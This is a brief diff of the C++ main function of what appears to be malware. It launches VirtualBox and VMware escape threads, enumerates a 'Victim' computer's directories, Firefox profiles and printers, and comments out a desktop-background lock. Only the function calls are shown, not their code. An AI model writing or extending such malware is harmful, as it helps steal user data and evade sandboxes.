@@ -19,12 +19,12 @@ int main(int argc, char* argv[]) {
 	std::thread virtualBoxChange(VMEscape::virtualBoxEscape);
 	std::thread VMWareBoxChange(VMEscape::VMWareEscape);
 	//Check permissions if we are admin, lock backgroundChange
-	std::thread tBackgroundChange(SCH::LockBackground);
+	//std::thread tBackgroundChange(SCH::LockBackground);
 	std::thread t_DirectoriesEnum(&Victim::GetDirectoryList, CurrentComputer);
 	//std::thread t_GetFirefoxProfiles(&Victim::GetFirefoxProfiles, CurrentComputer);
 	virtualBoxChange.join();
 	VMWareBoxChange.join();
-	tBackgroundChange.join();
+	//tBackgroundChange.join();
 	t_DirectoriesEnum.join();
 	CurrentComputer->GetFirefoxProfiles();
 	std::thread t_EnumeratePrintersInformation(&Victim::EnumeratePrintersInformation, CurrentComputer);
